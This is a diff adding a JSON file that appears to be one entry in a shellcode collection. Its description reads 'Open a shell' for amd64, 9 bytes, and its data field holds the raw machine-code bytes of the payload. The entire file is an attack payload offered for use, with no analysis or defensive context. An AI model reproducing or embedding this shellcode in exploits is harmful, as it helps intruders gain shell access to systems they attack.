@@ -1,0 +1,4 @@
+{
+  "info": "Abstract: Open a shell.\nLength: 9 \nArchitechure: amd64\nNULL byte: yes",
+  "data": "\\x5f\\x48\\x31\\xc0\\x58\\x5a\\x5e\\x0f\\x05"
+}
